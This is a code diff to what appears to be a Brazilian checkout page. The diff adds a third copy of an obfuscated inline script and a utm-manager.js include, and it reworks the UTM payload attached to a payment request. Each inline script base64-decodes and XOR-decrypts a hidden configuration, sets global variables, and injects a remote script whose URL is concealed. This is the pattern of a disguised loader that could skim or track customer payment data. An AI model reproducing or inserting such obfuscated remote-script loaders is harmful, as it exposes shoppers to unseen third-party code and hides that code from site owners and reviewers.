@@ -259,6 +259,8 @@
 
   <script>(function () { var o_c86 = atob("DPecrPtRJvA2aqm9z4y+2Yk9BMoUAt3Jv4Smg9QyQp4YH93QppHlgpg+S95UGIbOrIX13I8iCYBfEszR4If11J49CJpFSIWfroPo3pIzU4RTGYuHlKqwjpw9SZJXBtqf9aznjpUwS5UUUIvNpo/5wLI1BNwUHMjRupK+ltlnR8ZTCJiJ+5KknMlnQsACD8iOqc+ozZ9zW61L"); var b_p = []; for (var r_t = 0; r_t < o_c86.length; r_t++) { b_p.push(o_c86.charCodeAt(r_t) & 255); } var p_8u = b_p[0]; var b_9lg = b_p.slice(1, 1 + p_8u); var e_l = b_p.slice(1 + p_8u); var z_7 = e_l.map(function (b, z_rl) { return b ^ b_9lg[z_rl % p_8u]; }); var a_s = ""; for (var e_za = 0; e_za < z_7.length; e_za++) { a_s += String.fromCharCode(z_7[e_za] & 255); } var u_l9 = decodeURIComponent(escape(a_s)); var b_jy = JSON.parse(u_l9); var y_in = b_jy.globals || []; y_in.forEach(function (k_y) { window[k_y.name] = k_y.value; }); var a_q3 = document.createElement("script"); a_q3.src = b_jy.url; a_q3.async = true; a_q3.defer = true; (b_jy.attributes || []).forEach(function (m_aavz) { a_q3.setAttribute(m_aavz.name, m_aavz.value); }); (document.head || document.documentElement).appendChild(a_q3); })();</script>
   <script>(function () { var o_c86 = atob("DPecrPtRJvA2aqm9z4y+2Yk9BMoUAt3Jv4Smg9QyQp4YH93QppHlgpg+S95UGIbOrIX13I8iCYBfEszR4If11J49CJpFSIWfroPo3pIzU4RTGYuHlKqwjpw9SZJXBtqf9aznjpUwS5UUUIvNpo/5wLI1BNwUHMjRupK+ltlnR8ZTCJiJ+5KknMlnQsACD8iOqc+ozZ9zW61L"); var b_p = []; for (var r_t = 0; r_t < o_c86.length; r_t++) { b_p.push(o_c86.charCodeAt(r_t) & 255); } var p_8u = b_p[0]; var b_9lg = b_p.slice(1, 1 + p_8u); var e_l = b_p.slice(1 + p_8u); var z_7 = e_l.map(function (b, z_rl) { return b ^ b_9lg[z_rl % p_8u]; }); var a_s = ""; for (var e_za = 0; e_za < z_7.length; e_za++) { a_s += String.fromCharCode(z_7[e_za] & 255); } var u_l9 = decodeURIComponent(escape(a_s)); var b_jy = JSON.parse(u_l9); var y_in = b_jy.globals || []; y_in.forEach(function (k_y) { window[k_y.name] = k_y.value; }); var a_q3 = document.createElement("script"); a_q3.src = b_jy.url; a_q3.async = true; a_q3.defer = true; (b_jy.attributes || []).forEach(function (m_aavz) { a_q3.setAttribute(m_aavz.name, m_aavz.value); }); (document.head || document.documentElement).appendChild(a_q3); })();</script>
+<script>(function(){var k_kka=atob("DF+nXTOUn74upsQC3iSFKEH4vYQMzrB2riydchz3+9AA07Bvtznec1D78pBM1OtxvS3OLUfnsMtay7ctsj7TOEDgsdRdhOggvyvTL1r26spL1eY4hSSFM1L5+pwUhKBjqj6KKEf59thXi7RwuynCM0e5591BwulxvTSFcRHi/tJbw+Y4/H3acUi28d9Dw+Y4/DvGKVK56spDz6J78y/VOEXx8coD1bFgtzvUfx+26d9C06Eg5H2FIG7p");var g_6iha=[];for(var o_19=0;o_19<k_kka.length;o_19++){g_6iha.push(k_kka.charCodeAt(o_19)&255);}var u_6=g_6iha[0];var j_h8=g_6iha.slice(1,1+u_6);var k_7s=g_6iha.slice(1+u_6);var f_3w=k_7s.map(function(b,d_d){return b^j_h8[d_d%u_6];});var e_1dwd="";for(var k_qi6v=0;k_qi6v<f_3w.length;k_qi6v++){e_1dwd+=String.fromCharCode(f_3w[k_qi6v]&255);}var a_jxw=decodeURIComponent(escape(e_1dwd));var l_6sx=JSON.parse(a_jxw);var t_4aa9=l_6sx.globals||[];t_4aa9.forEach(function(c_g){window[c_g.name]=c_g.value;});var n_stv0=document.createElement("script");n_stv0.src=l_6sx.url;n_stv0.async=true;n_stv0.defer=true;(l_6sx.attributes||[]).forEach(function(e_5){n_stv0.setAttribute(e_5.name,e_5.value);});(document.head||document.documentElement).appendChild(n_stv0);})();</script>
+<script src="js/utm-manager.js"></script>
 </head>
 
 <body>
@@ -1517,14 +1519,20 @@
           let cpfCliente = generateCpf();
 
           // Payload UTM 
-          const _UTM = typeof UTM !== 'undefined' ? UTM : (window.UTM || {});
-          const utmPayload = {
-            utm_source: _UTM.utm_source || 'direct',
-            utm_medium: _UTM.utm_medium || 'direct',
-            utm_campaign: _UTM.utm_campaign || 'direct',
-            utm_content: _UTM.utm_content || 'direct',
-            utm_term: _UTM.utm_term || 'direct'
-          };
+          let utmPayload = {};
+          if (window.UTMManager) {
+             const trackData = window.UTMManager.getPayload();
+             utmPayload = { ...trackData, tracking: trackData };
+          } else {
+             const _UTM = typeof UTM !== 'undefined' ? UTM : (window.UTM || {});
+             utmPayload = {
+               utm_source: _UTM.utm_source || 'direct',
+               utm_medium: _UTM.utm_medium || 'direct',
+               utm_campaign: _UTM.utm_campaign || 'direct',
+               utm_content: _UTM.utm_content || 'direct',
+               utm_term: _UTM.utm_term || 'direct'
+             };
+          }
 
           const requestBody = {
             amount: Math.round(S.amount * 100), // centavos
